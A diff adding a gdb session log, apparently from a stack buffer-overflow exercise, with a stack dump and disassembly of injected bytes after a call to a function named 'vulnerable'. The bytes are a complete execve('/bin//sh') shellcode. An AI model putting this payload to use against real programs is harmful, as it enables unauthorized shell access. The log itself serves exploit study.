@@ -1,0 +1,41 @@
+
+   0x08049d70 <+76>:    call   0x8049cf5 <vulnerable>
+   0x08049d75 <+81>:    add    $0x10,%esp
+   0x08049d78 <+84>:    mov    $0x0,%eax
+
+
+(gdb) x/48xw $esp
+0xfffee800:     0xfffee81c      0xffffd068      0x00000000      0x08049d05
+0xfffee810:     0x00000000      0x00000000      0x00000000      0x99580b6a
+0xfffee820:     0x2f2f6852      0x2f686873      0x896e6962      0x895352e3
+0xfffee830:     0x0080cde1      0x00000000      0x00000000      0x00000000
+0xfffee840:     0x00000000      0x00000000      0x00000000      0x00000000
+0xfffee850:     0x00000000      0x00000000      0x00000000      0x00000000
+0xfffee860:     0x00000000      0x00000000      0x00000000      0x00000000
+0xfffee870:     0xffffcd68      0x00000730      0x0807b8d9      0x08075f6c
+0xfffee880:     0x00000000      0x080e5000      0xfffee8a8      0x08049d75
+0xfffee890:     0xffffd068      0x00000000      0x00000000      0x08049d34
+0xfffee8a0:     0x00000000      0x080e5000      0xffffcd68      0x08049edb
+0xfffee8b0:     0x00000002      0xffffce34      0xffffce40      0x00000000
+
+
+(gdb) disas/r 0xfffee81c, +32
+Dump of assembler code from 0xfffee81c to 0xfffee83c:
+   0xfffee81c:  6a 0b   push   $0xb
+   0xfffee81e:  58      pop    %eax
+   0xfffee81f:  99      cltd   
+   0xfffee820:  52      push   %edx
+   0xfffee821:  68 2f 2f 73 68  push   $0x68732f2f
+   0xfffee826:  68 2f 62 69 6e  push   $0x6e69622f
+   0xfffee82b:  89 e3   mov    %esp,%ebx
+   0xfffee82d:  52      push   %edx
+   0xfffee82e:  53      push   %ebx
+   0xfffee82f:  89 e1   mov    %esp,%ecx
+   0xfffee831:  cd 80   int    $0x80
+   0xfffee833:  00 00   add    %al,(%eax)
+   0xfffee835:  00 00   add    %al,(%eax)
+   0xfffee837:  00 00   add    %al,(%eax)
+   0xfffee839:  00 00   add    %al,(%eax)
+   0xfffee83b:  00 00   add    %al,(%eax)
+End of assembler dump.
+
